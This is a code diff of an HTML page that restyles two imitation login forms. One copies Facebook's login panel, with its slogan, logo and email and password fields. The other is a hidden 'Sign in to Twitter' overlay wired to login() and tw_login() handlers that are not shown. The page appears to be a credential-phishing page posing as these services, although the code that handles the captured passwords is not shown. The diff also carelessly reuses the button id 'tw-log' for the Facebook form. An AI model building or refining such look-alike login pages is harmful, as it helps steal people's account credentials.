@@ -141,9 +141,15 @@
         <div class="fb-panel fb-group">
           <img src="secured/img/logo.svg" alt="">
           <p>Facebook helps you connect and share with the people in your life.</p>
-          <input type="text" placeholder="Email or Phone number" required id="fb-email">
-          <input type="password" placeholder="Password" required id="fb-pass">
-          <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
+          <input
+            class="w-full px-4 py-2 text-gray-700 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+            type="text" placeholder="Email or Phone number" required id="fb-email">
+          <input
+            class="w-full px-4 py-2 text-gray-700 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+            type="password" placeholder="Password" required id="fb-pass">
+          <button
+            class="px-6 py-2 text-white bg-blue-500 rounded-lg shadow-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2"
+            onclick="login()" id="tw-log">Log In</button>
 
           <a href="#">Forgotten password?</a>
           <button id="create-btn">Create New Account</button>
@@ -158,46 +164,27 @@
   <!-- Twitter Login Form (Hidden initially) -->
   <div id="twitter-login"
     class="hidden fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
-    <div class="row">
-      <div class="none col-1 col-lg-4"></div>
-      <div class="none col-10 col-lg-5">
-        <div class="box bg-white mt-5 p-3">
-          <div class="nav mb-5">
-            <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
-          </div>
-          <div class="mb-4">
-            <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
-          </div>
 
-          <div class="margin mb-4">
-            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username"
-              required id="tw-email">
-            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required
-              id="tw-pass">
-            <button type="button"
-              class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill"
-              onclick="tw_login()" id="tw-log">
-              <p class="text-white"><b>Log In</b></p>
-            </button>
-          </div>
+    <main class="l-main">
+      <div class="fb-user">
+        <div class="fb-panel fb-group">
+          <img src="twt/IMG/twitter.png" alt="">
+          <h2 class="mb-4 text-center head"><b>Sign in to Twitter</b></h2>
+          <input
+            class="w-full px-4 py-2 text-gray-700 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+            type="text" placeholder="Email or Phone number" required id="tw-email">
+          <input
+            class="mt-4 w-full px-4 py-2 text-gray-700 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+            type="password" placeholder="Password" required id="tw-pass">
+          <button
+            class="mt-4 px-6 py-2 text-white bg-black rounded-lg shadow-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2"
+            onclick="tw_login()" id="tw-log">Log In</button><br>
 
-          <div class="margin mb-4">
-            <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
-              <p class="color-white"><b>Forgot password?</b></p>
-            </button>
-          </div>
-
-          <div class="margin">
-            <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
-          </div>
-
-          <div class="margin">
-          </div>
-
+          <a href="#">Forgot password?</a>
+          <button id="create-btn">Don't have an account? Sign Up</button>
         </div>
       </div>
-      <div class="none col-1 col-lg-3"></div>
-    </div>
+    </main>
   </div>
 
   <script>
